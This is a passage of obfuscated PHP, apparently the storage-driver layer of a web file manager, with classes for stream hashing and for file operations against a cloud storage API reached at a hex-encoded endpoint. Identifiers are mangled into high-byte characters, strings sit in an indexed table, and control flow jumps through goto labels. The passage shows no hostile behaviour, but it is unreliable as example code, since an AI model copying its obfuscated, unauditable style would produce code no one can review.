$D¹±ùÜ¼ì[91] . $Aœ¡ÙÍÂÌŠ[1]; } } class PathDriverStream extends PathDriverBase { const TYPE_STRING = 1; const TYPE_FILE = 2; public function __construct($EÀòó¬çá”, $AÈÇˆ„ĞÂ = 0) { parent::__construct(); $this->source = $EÀòó¬çá”; $this->sourceSize = $AÈÇˆ„ĞÂ; if (is_string($this->source)) { $this->sourceType = self::TYPE_STRING; $this->sourceSize = strlen($this->source); } else { $this->sourceType = self::TYPE_FILE; } } public function size($dííé˜©šµ = false) { return $this->sourceSize; } public function getContent($f·©«ÖÙòœ = false) { return $this->fileSubstr($f·©«ÖÙòœ, 0, $this->sourceSize); } public function fileSubstr($cÔ¬ùäÏ– = false, $f®¢ê†¦²Ì = 0, $f—¢ƒ»²‰¯ = 0) { if (!$f—¢ƒ»²‰¯) { $f—¢ƒ»²‰¯ = $this->sourceSize; } $CÚçÖ††ƒ = $this->sourceSize - $f®¢ê†¦²Ì; if ($f—¢ƒ»²‰¯ >= $CÚçÖ††ƒ) { $f—¢ƒ»²‰¯ = $CÚçÖ††ƒ; } if ($this->sourceType == self::TYPE_STRING) { return substr($this->source, $f®¢ê†¦²Ì, $f—¢ƒ»²‰¯); } if ($this->sourceType == self::TYPE_FILE) { if ($f—¢ƒ»²‰¯ <= 0) { return $_SERVER[úÎü][33]; } $FíâŞ—Ï = ftell($this->source); fseek_64($this->source, $FíâŞ—Ï + $f®¢ê†¦²Ì); $C—ÂÊç˜‹¢ = @fread($this->source, $f—¢ƒ»²‰¯); fseek_64($this->source, $FíâŞ—Ï); return $C—ÂÊç˜‹¢; } } public function hashMd5($bÉë”­‚ = false) { return md5($this->getContent()); } public static function hash($CÙÂ‡”Öí, $dåáÆÖçÆ = 0) { $då»î„ë—‘ = new PathDriverStream($CÙÂ‡”Öí, $dåáÆÖçÆ); return $då»î„ë—‘->hashSimple($CÙÂ‡”Öí); } public static function md5($d’Ë¯³ò’¨, $E¢·ñßÁã = 0) { $CáƒÃÚÔù = new PathDriverStream($d’Ë¯³ò’¨, $E¢·ñßÁã); return $CáƒÃÚÔù->hashMd5($d’Ë¯³ò’¨); } } class PathDriverUSS extends PathDriverBase { protected $bucket = ''; protected $username = ''; protected $userpass = ''; protected $domain = ''; protected $token = ''; protected $endpoint = "\x68\164\x74\x70\72\x2f\x2f\x76\x30\x2e\141\160\151\x2e\x75\160\171\x75\156\x2e\143\x6f\155"; public $ioUploadServer = 0; public $ioFileOutServer = 0; public function __construct($FÒØÜĞŠÄÑ) { parent::__construct(); $this->_init($FÒØÜĞŠÄÑ); } public function _init($dÌµƒÎõí©) { $e„Ó›ÏµŞï =& $_SERVER[úÎü]; foreach ($dÌµƒÎõí© as $DÂ©ÉÈÊ‰ => $D…Îå²ã¨) { if (isset($this->{$DÂ©ÉÈÊ‰})) { $this->{$DÂ©ÉÈÊ‰} = $D…Îå²ã¨; } } if (empty($this->username) || empty($this->userpass) || empty($this->domain)) { throw new Exception($e„Ó›ÏµŞï[1285] . LNG($e„Ó›ÏµŞï[1217])); } } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } private function ussHeaders($b‡‹İÛ®¬, $DÇ ÀĞŒÈ— = "\107\x45\x54") { $B–Ì¯¼‡‰ˆ =& $_SERVER[úÎü]; $fóëŠî»ÇÌ = gmdate($B–Ì¯¼‡‰ˆ[1251]); $C‹¦‡¸÷Ô = base64_encode(hash_hmac($B–Ì¯¼‡‰ˆ[1286], "{$DÇ ÀĞŒÈ—}\x26{$b‡‹İÛ®¬}\46{$fóëŠî»ÇÌ}", md5("{$this->userpass}"), !0)); $D¬Ø³º‹Ïù = array("\101\165\164\150\157\x72\x69\x7a\x61\164\151\x6f\156\72\x55\120\x59\125\x4e\40{$this->username}\72{$C‹¦‡¸÷Ô}", "\x44\141\x74\145\x3a{$fóëŠî»ÇÌ}"); return $D¬Ø³º‹Ïù; } public function ussRequest($A‹ÁƒØ³›, $bÏÉ„”—Ñ = "\x47\x45\x54", $fƒ¦‹Š×Š° = false, $b£…ø•ª°£ = false, $E¥¶××ğ¨â = false) { goto EˆÌ’ï×£å; dÉİ²…®åî: if (!$Fèà«ƒ®›æ) { return array($FğØ¥ºÉ¤™[1046] => !1, $FğØ¥ºÉ¤™[1048] => $FğØ¥ºÉ¤™[1287]); } if (strtolower($bÏÉ„”—Ñ) == $FğØ¥ºÉ¤™[188] || in_array($Fèà«ƒ®›æ[$FğØ¥ºÉ¤™[1046]], array($FğØ¥ºÉ¤™[1145], $FğØ¥ºÉ¤™[1288]))) { $fƒ¦‹Š×Š° = $Fèà«ƒ®›æ[$FğØ¥ºÉ¤™[1289]]; } else { $fƒ¦‹Š×Š° = json_decode($Fèà«ƒ®›æ[$FğØ¥ºÉ¤™[1048]], !0); if (!$fƒ¦‹Š×Š°) { $fƒ¦‹Š×Š° = $Fèà«ƒ®›æ[$FğØ¥ºÉ¤™[1048]]; } else { if (!$Fèà«ƒ®›æ[$FğØ¥ºÉ¤™[690]] && isset($fƒ¦‹Š×Š°[$FğØ¥ºÉ¤™[1290]])) { $fƒ¦‹Š×Š° = $fƒ¦‹Š×Š°[$FğØ¥ºÉ¤™[1290]]; } } } return array($FğØ¥ºÉ¤™[1046] => $Fèà«ƒ®›æ[$FğØ¥ºÉ¤™[690]], $FğØ¥ºÉ¤™[1048] => $fƒ¦‹Š×Š°); goto D¹»µ¦­¤¶; D™áÀã‰Œª: $E±¤–¼ë…İ = $this->ussHeaders($E„ÕÑµåË«, $bÏÉ„”—Ñ); if ($b£…ø•ª°£) { $E±¤–¼ë…İ = array_merge($E±¤–¼ë…İ, $b£…ø•ª°£); } $Fèà«ƒ®›æ = url_request($this->endpoint . $E„ÕÑµåË«, $bÏÉ„”—Ñ, $fƒ¦‹Š×Š°, $E±¤–¼ë…İ, $E¥¶××ğ¨â); goto dÉİ²…®åî; EˆÌ’ï×£å: $FğØ¥ºÉ¤™ =& $_SERVER[úÎü]; $A‹ÁƒØ³› = trim($A‹ÁƒØ³›, $FğØ¥ºÉ¤™[8]); $E„ÕÑµåË« = "\x2f{$this->bucket}\x2f{$A‹ÁƒØ³›}"; goto D™áÀã‰Œª; D¹»µ¦­¤¶: } public function mkfile($A¡ÍîØîÔ, $cáâ™†ï¯Ç = '', $cãÖøàô = REPEAT_RENAME) { if ($this->setContent($A¡ÍîØîÔ, $cáâ™†ï¯Ç)) { return $this->getPathOuter($A¡ÍîØîÔ); } return !1; } public function mkdir($Aº˜·ŒòĞÖ, $b‘§ŞÊ Š” = REPEAT_SKIP) { $Aà÷œˆºÃ¿ =& $_SERVER[úÎü]; $B÷¨…Ğ›¨ = trim($Aº˜·ŒòĞÖ, $Aà÷œˆºÃ¿[8]); if ($this->_isFolder($B÷¨…Ğ›¨)) { return $this->getPathOuter($B÷¨…Ğ›¨); } $c•ù·‹ˆÁ« = array($Aà÷œˆºÃ¿[1291]); $aÕí…é¯Â÷ = $this->ussRequest($B÷¨…Ğ›¨, $Aà÷œˆºÃ¿[220], !1, $c•ù·‹ˆÁ«); return $aÕí…é¯Â÷[$Aà÷œˆºÃ¿[1046]] ? $this->getPathOuter($B÷¨…Ğ›¨) : !1; } public function copyFile($C‚î¹ñ“, $c÷äÅŒªå§) { $f¾…ƒÑĞ =& $_SERVER[úÎü]; $Aƒ‚Î‹À¸ = array($f¾…ƒÑĞ[1292] . "\x2f{$this->bucket}\57{$C‚î¹ñ“}", $f¾…ƒÑĞ[1293]); $D½“„‚•Ù = $this->ussRequest($c÷äÅŒªå§, $f¾…ƒÑĞ[222], !1, $Aƒ‚Î‹À¸); return $D½“„‚•Ù[$f¾…ƒÑĞ[1046]] ? !0 : $this->getPathOuter($c÷äÅŒªå§); } public function moveFile($BßîæÕ‚Š, $F¹‰·ŸÊ¶‰) { $DŒ¤©ùÊ =& $_SERVER[úÎü]; $DÕ–ê¼áŒ¯ = array($DŒ¤©ùÊ[1294] . "\x2f{$this->bucket}\x2f{$BßîæÕ‚Š}", $DŒ¤©ùÊ[1293]); $eÊŸ¼“õ°ğ = $this->ussRequest($F¹‰·ŸÊ¶‰, $DŒ¤©ùÊ[222], !1, $DÕ–ê¼áŒ¯); return $eÊŸ¼“õ°ğ[$DŒ¤©ùÊ[1046]] ? !0 : $this->getPathOuter($F¹‰·ŸÊ¶‰); } public function delFile($d•“ÊëÆ¦“) { $CÀ‚ÖÌÛ‘ =& $_SERVER[úÎü]; $EĞİÛ·¡¤Ì = $this->ussRequest($d•“ÊëÆ¦“, $CÀ‚ÖÌÛ‘[1295]); return $EĞİÛ·¡¤Ì[$CÀ‚ÖÌÛ‘[1046]] ? !0 : !1; } public function delFolder($b´—òÏ‰‚ñ) { goto D·À£ƒ¾¾Å; D·À£ƒ¾¾Å: $AÃ·¸¼Ä†Ÿ =& $_SERVER[úÎü]; if (!$this->exist($b´—òÏ‰‚ñ)) { return !0; } $this->listItemCache = !1; goto EäÕñÓÍ×; B¤Çìšë¶: return $CñÕÔ‚ÉŸ[$AÃ·¸¼Ä†Ÿ[1046]]; goto a‰†ÉÓäó»; a¶ÒÓÌ³éè: foreach ($DÉ¯ä¢«ï as $E¥³•÷¼ºŠ) { $CñÕÔ‚ÉŸ = $this->ussRequest($E¥³•÷¼ºŠ[$AÃ·¸¼Ä†Ÿ[28]], $AÃ·¸¼Ä†Ÿ[1295]); if (!$CñÕÔ‚ÉŸ[$AÃ·¸¼Ä†Ÿ[1046]]) { return !1; } } foreach ($D‹ì†£…“ as $BÒ‘õªÙå™) { $CñÕÔ‚ÉŸ = $this->ussRequest($BÒ‘õªÙå™, $AÃ·¸¼Ä†Ÿ[1295]); if (!$CñÕÔ‚ÉŸ[$AÃ·¸¼Ä†Ÿ[1046]]) { return !1; } } $CñÕÔ‚ÉŸ = $this->ussRequest($b´—òÏ‰‚ñ, $AÃ·¸¼Ä†Ÿ[1295]); goto B¤Çìšë¶; EäÕñÓÍ×: $D‹ì†£…“ = $DÉ¯ä¢«ï = array(); $this->fileList($b´—òÏ‰‚ñ, $D‹ì†£…“, $DÉ¯ä¢«ï, !0); $this->listItemCache = !0; goto a¶ÒÓÌ³éè; a‰†ÉÓäó»: } public function rename($eÒ½Ü°Ì‘­, $e½å±˜æ) { if ($this->isFile($eÒ½Ü°Ì‘­)) { $e½å±˜æ = get_path_father($eÒ½Ü°Ì‘­) . $e½å±˜æ; return $this->moveFile($eÒ½Ü°Ì‘­, $e½å±˜æ); } return $this->renameObject($eÒ½Ü°Ì‘­, $e½å±˜æ); } public function fileInfo($dòŸìö÷†­, $B¶Ó±ñÁŞ = false, $E™¾Ôíù§ = array()) { goto Bƒ¢—ÚÛóó; Bƒ¢—ÚÛóó: $a¡‚íìôğ =& $_SERVER[úÎü]; $BËÎØ‡Æî = array($a¡‚íìôğ[28] => $this->pathThis($dòŸìö÷†­), $a¡‚íìôğ[75] => $this->getPathOuter($a¡‚íìôğ[8] . $dòŸìö÷†­), $a¡‚íìôğ[29] => $a¡‚íìôğ[171], $a¡‚íìôğ[77] => isset($E™¾Ôíù§[$a¡‚íìôğ[77]]) ? $E™¾Ôíù§[$a¡‚íìôğ[77]] : 0, $a¡‚íìôğ[165] => $this->ext($dòŸìö÷†­)); if ($B¶Ó±ñÁŞ) { return $BËÎØ‡Æî; } goto FÏ¦ª‰á¸¥; FÏ¦ª‰á¸¥: $BËÎØ‡Æî[$a¡‚íìôğ[190]] = $BËÎØ‡Æî[$a¡‚íìôğ[107]] = 0; $BËÎØ‡Æî[$a¡‚íìôğ[191]] = $BËÎØ‡Æî[$a¡‚íìôğ[192]] = !0; if (empty($E™¾Ôíù§)) { $E™¾Ôíù§ = $this->objectMeta($dòŸìö÷†­); if (!$E™¾Ôíù§) { return $BËÎØ‡Æî; } } goto f‘“¸ŠšÊ’; f‘“¸ŠšÊ’: $BËÎØ‡Æî[$a¡‚íìôğ[190]] = intval($E™¾Ôíù§[$a¡‚íìôğ[1296]]); $BËÎØ‡Æî[$a¡‚íìôğ[107]] = intval($E™¾Ôíù§[$a¡‚íìôğ[1297]]); $BËÎØ‡Æî[$a¡‚íìôğ[77]] = $E™¾Ôíù§[$a¡‚íìôğ[77]]; goto CÔ¡ÊÀê´‚; CÔ¡ÊÀê´‚: return $BËÎØ‡Æî; goto F§àÜˆœåœ; F§àÜˆœåœ: } public function folderInfo($D‘ñğ Ó, $b¼ÏÏâœÏé = false) { goto A¨Œñ³í¢ø; b×†Ëøôº: $FŒ‘‘Äß×[$dùÆ¿÷µáÂ[190]] = intval($b²¢ÇÓ¥[$dùÆ¿÷µáÂ[1296]]); $FŒ‘‘Äß×[$dùÆ¿÷µáÂ[107]] = intval($b²¢ÇÓ¥[$dùÆ¿÷µáÂ[1297]]); return $FŒ‘‘Äß×; goto aÑ‘Ô¬Öää; A¨Œñ³í¢ø: $dùÆ¿÷µáÂ =& $_SERVER[úÎü]; $FŒ‘‘Äß× = array($dùÆ¿÷µáÂ[28] => $this->pathThis($D‘ñğ Ó), $dùÆ¿÷µáÂ[75] => $this->getPathOuter($dùÆ¿÷µáÂ[8] . $D‘ñğ Ó), $dùÆ¿÷µáÂ[29] => $dùÆ¿÷µáÂ[76]); if ($b¼ÏÏâœÏé) { return $FŒ‘‘Äß×; } goto DºÚÙÒÈ³ò; DºÚÙÒÈ³ò: $FŒ‘‘Äß×[$dùÆ¿÷µáÂ[190]] = $FŒ‘‘Äß×[$dùÆ¿÷µáÂ[107]] = 0; $FŒ‘‘Äß×[$dùÆ¿÷µáÂ[191]] = $FŒ‘‘Äß×[$dùÆ¿÷µáÂ[192]] = !0; if (empty($b²¢ÇÓ¥)) { $b²¢ÇÓ¥ = $this->objectMeta($D‘ñğ Ó); if (!$b²¢ÇÓ¥) { return $FŒ‘‘Äß×; } } goto b×†Ëøôº; aÑ‘Ô¬Öää: } private function listObjs($BŸ‘ƒÙ¨±Î, $Fğ¼ÕÏ”¬Î = 0, $aÔ„†çÌÃ = 1000) { $D¯é¡„Ù«‹ =& $_SERVER[úÎü]; $c®„ø«¡ô = array($D¯é¡„Ù«‹[1298], $D¯é¡„Ù«‹[1299] . $aÔ„†çÌÃ); if ($Fğ¼ÕÏ”¬Î) { $c®„ø«¡ô[] = $D¯é¡„Ù«‹[1300] . $Fğ¼ÕÏ”¬Î; } $e³†¿³Ö¢¿ = $this->ussRequest($BŸ‘ƒÙ¨±Î, $D¯é¡„Ù«‹[224], !1, $c®„ø«¡ô); return !$e³†¿³Ö¢¿[$D¯é¡„Ù«‹[1046]] ? !1 : $e³†¿³Ö¢¿[$D¯é¡„Ù«‹[1048]]; } private function fileList($bà§Ù‘¨¬ğ, &$a‘£ÑÕ«ä, &$añÛÄ÷ğÆ¬, $cˆ†èò¿ = false) { goto e®£ÏÒ§Çä; e®£ÏÒ§Çä: $a¯„íÒŠí =& $_SERVER[úÎü]; $FƒçÜ«‘­ = $a¯„íÒŠí[33]; $B‡®°‹‚µù = 1000; goto AÂÏ½¬´ƒ; AÂÏ½¬´ƒ: $BÓŸÊç˜ = rtrim($bà§Ù‘¨¬ğ, $a¯„íÒŠí[8]) . $a¯„íÒŠí[8]; $b©ù³Şƒ¿ = $this->listItemCache === !1 ? !1 : !0; while (!0) { check_abort(); $cÄ¨ÚÒÔ— = $this->listObjs($bà§Ù‘¨¬ğ, $FƒçÜ«‘­, $B‡®°‹‚µù); if (!$cÄ¨ÚÒÔ—) { return !1; } $FƒçÜ«‘­ = isset($cÄ¨ÚÒÔ—[$a¯„íÒŠí[1301]]) ? $cÄ¨ÚÒÔ—[$a¯„íÒŠí[1301]] : $a¯„íÒŠí[33]; $e¢à•Áµ™¼ = isset($cÄ¨ÚÒÔ—[$a¯„íÒŠí[1302]]) ? $cÄ¨ÚÒÔ—[$a¯„íÒŠí[1302]] : array(); foreach ($e¢à•Áµ™¼ as $f£äœùÌÃ­) { $B›Òïœ£Á = $f£äœùÌÃ­[$a¯„íÒŠí[29]] == $a¯„íÒŠí[76] ? !0 : !1; $eµö¤ÈµÌ¬ = ltrim($BÓŸÊç˜ . $f£äœùÌÃ­[$a¯„íÒŠí[28]], $a¯„íÒŠí[8]) . ($B›Òïœ£Á ? $a¯„íÒŠí[8] : $a¯„íÒŠí[33]); $c¨–††ßŒ = array($a¯„íÒŠí[28] => $eµö¤ÈµÌ¬, $a¯„íÒŠí[29] => $B›Òïœ£Á ? $a¯„íÒŠí[76] : $a¯„íÒŠí[171], $a¯„íÒŠí[77] => $f£äœùÌÃ­[$a¯„íÒŠí[331]], $a¯„íÒŠí[1297] => $f£äœùÌÃ­[$a¯„íÒŠí[1303]]); if ($b©ù³Şƒ¿) { $this->cacheMethod($a¯„íÒŠí[195], $eµö¤ÈµÌ¬, $B›Òïœ£Á); $this->cacheMethod($a¯„íÒŠí[196], $eµö¤ÈµÌ¬, $c¨–††ßŒ); } if ($B›Òïœ£Á) { $a‘£ÑÕ«ä[] = $eµö¤ÈµÌ¬; if ($cˆ†èò¿) { $this->fileList($eµö¤ÈµÌ¬, $a‘£ÑÕ«ä, $añÛÄ÷ğÆ¬, $cˆ†èò¿); } continue; } $añÛÄ÷ğÆ¬[] = $c¨–††ßŒ; } if (count($e¢à•Áµ™¼) < $B‡®°‹‚µù) { break; } } goto Cö•çĞó˜Å; Cö•çĞó˜Å: if ($b©ù³Şƒ¿) { $this->cacheMethod($a¯„íÒŠí[195], $bà§Ù‘¨¬ğ, !0); } goto bƒ³˜¡¢¶; bƒ³˜¡¢¶: } public function listPath($AËâóñÊî°, $c–àÔ³ºôğ = false) { $d°‡Ø¡²Ù« =& $_SERVER[úÎü]; $aƒ­Ç˜Äæ = $f„î›´Õ¹å = array(); $this->fileList($AËâóñÊî°, $aƒ­Ç˜Äæ, $f„î›´Õ¹å); foreach ($aƒ­Ç˜Äæ as $eøñÉ’©ö => $Aßæô½ŠÖ”) { $aƒ­Ç˜Äæ[$eøñÉ’©ö] = $this->folderInfo($Aßæô½ŠÖ”, $c–àÔ³ºôğ); } foreach ($f„î›´Õ¹å as $eøñÉ’©ö => $Aßæô½ŠÖ”) { $f„î›´Õ¹å[$eøñÉ’©ö] = $this->fileInfo($Aßæô½ŠÖ”[$d°‡Ø¡²Ù«[28]], $c–àÔ³ºôğ, $Aßæô½ŠÖ”); } return array($d°‡Ø¡²Ù«[74] => $aƒ­Ç˜Äæ, $d°‡Ø¡²Ù«[73] => $f„î›´Õ¹å); } public function has($E®åŠ®œ¡İ, $C¥¦ŠÆšãä = false, $F†ò¦‘é… = true) { goto B‹äØ“Óì’; a÷÷½æ®¡: while (!0) { check_abort(); $aÏâø–¬˜Í = $this->listObjs($E®åŠ®œ¡İ, $aáÕš˜±Ñ, $B‘¾‚ß¥Òå); if (!$aÏâø–¬˜Í) { return !1; } $aáÕš˜±Ñ = isset($aÏâø–¬˜Í[$cäÇÜ…¢†í[1301]]) ? $aÏâø–¬˜Í[$cäÇÜ…¢†í[1301]] : $cäÇÜ…¢†í[33]; $e½Ì¯ÄÌé = isset($aÏâø–¬˜Í[$cäÇÜ…¢†í[1302]]) ? $aÏâø–¬˜Í[$cäÇÜ…¢†í[1302]] : array(); if (empty($e½Ì¯ÄÌé)) { break; } $C×ëó½¸… = array_filter($e½Ì¯ÄÌé, function ($c»šòçÜèµ) { $DÈÌ›ŠÊ‰ =& $_SERVER[úÎü]; return $c»šòçÜèµ[$DÈÌ›ŠÊ‰[29]] == $DÈÌ›ŠÊ‰[76]; }); $eîÀóÚÈ = count($e½Ì¯ÄÌé); $C×ëó½¸… = count($C×ëó½¸…); $a«‰¸Á©· = $eîÀóÚÈ - $C×ëó½¸…; if ($C¥¦ŠÆšãä) { $FŒğƒÈÍ„¦ += $C×ëó½¸…; $F¹±÷ÃÅ¡ += $a«‰¸Á©·; if ($eîÀóÚÈ < $B‘¾‚ß¥Òå) { break; } continue; } if ($F†ò¦‘é…) { if ($a«‰¸Á©·) { return !0; } } else { if ($C×ëó½¸…) { return !0; } } if ($eîÀóÚÈ < $B‘¾‚ß¥Òå) { break; } } if ($C¥¦ŠÆšãä) { return array($cäÇÜ…¢†í[199] => $F¹±÷ÃÅ¡, $cäÇÜ…¢†í[200] => $FŒğƒÈÍ„¦); } return !1; goto C¤Õ³õ‡Êå; B‹äØ“Óì’: $cäÇÜ…¢†í =& $_SERVER[úÎü]; $aáÕš˜±Ñ = $cäÇÜ…¢†í[33]; $B‘¾‚ß¥Òå = 500; goto b¿¡Éëœ®; b¿¡Éëœ®: $F¹±÷ÃÅ¡ = 0; $FŒğƒÈÍ„¦ = 0; $F Õã±Ò ï = rtrim($E®åŠ®œ¡İ, $cäÇÜ…¢†í[8]) . $cäÇÜ…¢†í[8]; goto a÷÷½æ®¡; C¤Õ³õ‡Êå: } public function listAll($e‘ß°ä¼) { goto aÌœ„ØÊÎ¬; eÛÕ¦ößâö: $F…ÚÃ¸æ = array(); foreach ($a‚òòÈâàÛ as $Cì“¢ËÒË‰) { $F…ÚÃ¸æ[$Cì“¢ËÒË‰[$CŞšÁ à¢Ì[28]]] = $Cì“¢ËÒË‰[$CŞšÁ à¢Ì[77]]; } foreach ($d¡Ğ”Ôå‡ as $Cì“¢ËÒË‰) { if (is_string($Cì“¢ËÒË‰)) { $F…ÚÃ¸æ[$Cì“¢ËÒË‰] = 0; } } goto A‚†‚ù¤ÎÑ; aÌœ„ØÊÎ¬: $CŞšÁ à¢Ì =& $_SERVER[úÎü]; $d¡Ğ”Ôå‡ = $a‚òòÈâàÛ = array(); $this->fileList($e‘ß°ä¼, $d¡Ğ”Ôå‡, $a‚òòÈâàÛ, !0); goto eÛÕ¦ößâö; A‚†‚ù¤ÎÑ: return $this->listAllFiles($e‘ß°ä¼, array_keys($F…ÚÃ¸æ), $F…ÚÃ¸æ); goto FãÂ×²¼–›; FãÂ×²¼–›: } public function canRead($DÍ¼±åÎÀæ) { return $this->exist($DÍ¼±åÎÀæ) ? !0 : !1; } public function canWrite($eˆóâ’‡÷ä) { return $this->exist($eˆóâ’‡÷ä) ? !0 : !1; } public function getContent($cöìÜÎ¨™¾) { return $this->fileSubstr($cöìÜÎ¨™¾, 0, -1); } public function setContent($Aô‡ÄÙ¯Õõ, $DóçÓáØã = '') { $C‘œ¯ÉìÃÑ =& $_SERVER[úÎü]; if (!$DóçÓáØã) { $bÉ¯¹†‰ÓÃ = $this->ussRequest($Aô‡ÄÙ¯Õõ, $C‘œ¯ÉìÃÑ[220]); return $bÉ¯¹†‰ÓÃ[$C‘œ¯ÉìÃÑ[1046]]; } $FŒî”ö®‡„ = $this->tempFile($this->pathThis($Aô‡ÄÙ¯Õõ)); file_put_contents($FŒî”ö®‡„, $DóçÓáØã); if ($this->upload($Aô‡ÄÙ¯Õõ, $FŒî”ö®‡„)) { $this->tempFileRemve($FŒî”ö®‡„); return !0; } return !1; } public function fileSubstr($b®‹µİÔò, $EÃ¬’ÜÊè, $Aóèàö´Î—) { $f‘‚‹ï´”² =& $_SERVER[úÎü]; if (!($Cô©‡ËÔ˜ë = $this->link($b®‹µİÔò))) { return !1; } $CÔêùğ³ñ­ = !1; if ($Aóèàö´Î— > 0) { $e„áÒŒ·×« = $EÃ¬’ÜÊè + $Aóèàö´Î— - 1; $CÔêùğ³ñ­ = array($f‘‚‹ï´”²[1264] . $EÃ¬’ÜÊè . $f‘‚‹ï´”²[428] . $e„áÒŒ·×«); } $A Ï»á¿¢Ì = url_request($Cô©‡ËÔ˜ë, $f‘‚‹ï´”²[224], !1, $CÔêùğ³ñ­); return $A Ï»á¿¢Ì[$f‘‚‹ï´”²[690]] ? $A Ï»á¿¢Ì[$f‘‚‹ï´”²[1048]] : !1; } public function upload($eÛ¹Âé«Â­, $FÃ‹ë„Æ˜‰, $BÅ«ØßªŞÒ = false, $e‰§“İæœ¾ = REPEAT_REPLACE) { goto F„¤‰Íğ¿š; A‚Á÷ğÜõ’: $CÅ¯Ğ°‡‡÷ = 1024 * 1024 * 10; $E¿Ô¹¸öÆø = array($aæŸ‘˜¨Å½[1305], $aæŸ‘˜¨Å½[1306] . $C·²ñùí, $aæŸ‘˜¨Å½[1307], $aæŸ‘˜¨Å½[1308] . $CÅ¯Ğ°‡‡÷); $Eº¸«ƒ‰áå = $this->ussRequest($eÛ¹Âé«Â­, $aæŸ‘˜¨Å½[222], !1, $E¿Ô¹¸öÆø); goto AĞçäïº§Õ; EÂ§À§ïŒ: do { $AáÜ­é¶¨ï = $A¤ÚŒ¤ù†ò[$aæŸ‘˜¨Å½[1310]]; fseek_64($CˆËƒ¸ÁŞ, $DÜ‹ÅöÅ—¬); $bã®•ÜÒÍ¥ = fread($CˆËƒ¸ÁŞ, $AáÜ­é¶¨ï); $B«Ò‡¦ˆÛõ = 0; do { $B«Ò‡¦ˆÛõ++; $A¤ÚŒ¤ù†ò = $this->uploadPart($eÛ¹Âé«Â­, $A¤ÚŒ¤ù†ò, $bã®•ÜÒÍ¥); } while (!$A¤ÚŒ¤ù†ò && $B«Ò‡¦ˆÛõ < 3); if (!$A¤ÚŒ¤ù†ò) { return !1; } $E…ñ¯Ê÷¡ô = $A¤ÚŒ¤ù†ò[$aæŸ‘˜¨Å½[1309]]; $DÜ‹ÅöÅ—¬ += $AáÜ­é¶¨ï; } while ($E…ñ¯Ê÷¡ô != -1); fclose($CˆËƒ¸ÁŞ); $E¿Ô¹¸öÆø = array($aæŸ‘˜¨Å½[1311], $aæŸ‘˜¨Å½[1312] . $A¤ÚŒ¤ù†ò[$aæŸ‘˜¨Å½[1313]], $aæŸ‘˜¨Å½[1307]); goto f¸É¨–œÕØ; AĞçäïº§Õ: if (!$Eº¸«ƒ‰áå[$aæŸ‘˜¨Å½[1046]]) { return !1; } $A¤ÚŒ¤ù†ò = $Eº¸«ƒ‰áå[$aæŸ‘˜¨Å½[1048]]; $DÜ‹ÅöÅ—¬ = 0; goto dÂæâ¹ÔÀ¹; dÂæâ¹ÔÀ¹: $E…ñ¯Ê÷¡ô = $A¤ÚŒ¤ù†ò[$aæŸ‘˜¨Å½[1309]]; $CˆËƒ¸ÁŞ = fopen($FÃ‹ë„Æ˜‰, $aæŸ‘˜¨Å½[1214]); if (!$CˆËƒ¸ÁŞ) { return !1; } goto EÂ§À§ïŒ; F„¤‰Íğ¿š: $aæŸ‘˜¨Å½ =& $_SERVER[úÎü]; $C·²ñùí = IO::size($FÃ‹ë„Æ˜‰); if ($C·²ñùí <= 1024 * 1024 * 200) { $CÏ‘”Üö¬ = array($aæŸ‘˜¨Å½[1304] . $FÃ‹ë„Æ˜‰); $Eº¸«ƒ‰áå = $this->ussRequest($eÛ¹Âé«Â­, $aæŸ‘˜¨Å½[222], $CÏ‘”Üö¬); return $Eº¸«ƒ‰áå[$aæŸ‘˜¨Å½[1046]] ? $this->getPathOuter($eÛ¹Âé«Â­) : !1; } goto A‚Á÷ğÜõ’; f¸É¨–œÕØ: $Eº¸«ƒ‰áå = $this->ussRequest($eÛ¹Âé«Â­, $aæŸ‘˜¨Å½[222], !1, $E¿Ô¹¸öÆø); return $Eº¸«ƒ‰áå[$aæŸ‘˜¨Å½[1046]] ? $this->getPathOuter($Eëšƒéóé¨) : !1; goto BÌ‰×¬‚Ö; BÌ‰×¬‚Ö: } private function uploadPart($b‰„÷¦Å™, $eØ¶„²™±‚, &$b®Ò¦ŞÛ×») { $A¿¼ê‡¾£Î =& $_SERVER[úÎü]; $F¥×Şƒİ‰ = array($A¿¼ê‡¾£Î[1314], $A¿¼ê‡¾£Î[1312] . $eØ¶„²™±‚[$A¿¼ê‡¾£Î[1313]], $A¿¼ê‡¾£Î[1315] . $eØ¶„²™±‚[$A¿¼ê‡¾£Î[1309]], $A¿¼ê‡¾£Î[138] . $eØ¶„²™±‚[$A¿¼ê‡¾£Î[1310]]); $a‡Ò´‡¯¾¹ = $this->ussRequest($b‰„÷¦Å™, $A¿¼ê‡¾£Î[222], $b®Ò¦ŞÛ×», $F¥×Şƒİ‰); return !$a‡Ò´‡¯¾¹[$A¿¼ê‡¾£Î[1046]] ? $a‡Ò´‡¯¾¹[$A¿¼ê‡¾£Î[1046]] : $a‡Ò´‡¯¾¹[$A¿¼ê‡¾£Î[1048]]; } public function uploadFormData($AäßªÒ°µ, $döèè­‚İ› = 3600) { return $this->uploadPolicy($AäßªÒ°µ, $döèè­‚İ›); } public function multiUploadFormData($A£¬ÀñÜ¹¾, $FÎƒÑôçÈ· = 3600) { $a„×§¦’©÷ =& $_SERVER[úÎü]; $e„Âõ†Ÿ¾ = (int) $GLOBALS[$a„×§¦’©÷[7]][$a„×§¦’©÷[77]]; return $this->uploadPolicy($A£¬ÀñÜ¹¾, $FÎƒÑôçÈ·, $e„Âõ†Ÿ¾); } private function uploadPolicy($b«ˆ¼Â¿ß±, $AÄÎ‹ÈŞ¸î = 3600, $F’¬‡¼âØº = 0) { goto a­³Ûİ¿—î; a­³Ûİ¿—î: $AÍÔÏ³™„× =& $_SERVER[úÎü]; $Cù…©‹†¼ = $AÍÔÏ³™„×[8] . $this->bucket; $Bà²‚Ç — = gmdate($AÍÔÏ³™„×[1251]); goto b ¤‰ø­³Ğ; CÍôâø²“¥: $aÒÁÑ‚ìñÉ = base64_encode(hash_hmac($AÍÔÏ³™„×[1286], "\x50\117\x53\124\x26{$Cù…©‹†¼}\46{$Bà²‚Ç —}\x26{$FÈŞÆœñˆ}", md5("{$this->userpass}"), !0)); $B…ğ‡¶œ¡ = array($AÍÔÏ³™„×[1157] => $FÈŞÆœñˆ, $AÍÔÏ³™„×[1320] => "\125\x50\131\125\116\x20{$this->username}\x3a{$aÒÁÑ‚ìñÉ}", $AÍÔÏ³™„×[173] => $this->endpoint . $Cù…©‹†¼); return $B…ğ‡¶œ¡; goto AóÍÜİëÛ¨; b 